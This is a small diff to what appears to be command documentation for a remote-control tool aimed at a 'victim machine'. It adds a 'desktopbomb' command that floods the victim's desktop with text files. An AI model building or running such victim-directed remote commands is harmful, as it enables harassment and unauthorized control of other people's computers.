@@ -52,6 +52,11 @@ desktop - sends the input "win + D" to the victim machine keyboard
 no parameters
 
 
+desktopbomb - spams the desktop with x (where x is a number) text file
+desktopbomb 4 (will spam the desktop with 4 text file)
+
+
+
 download - work in progress
 
 
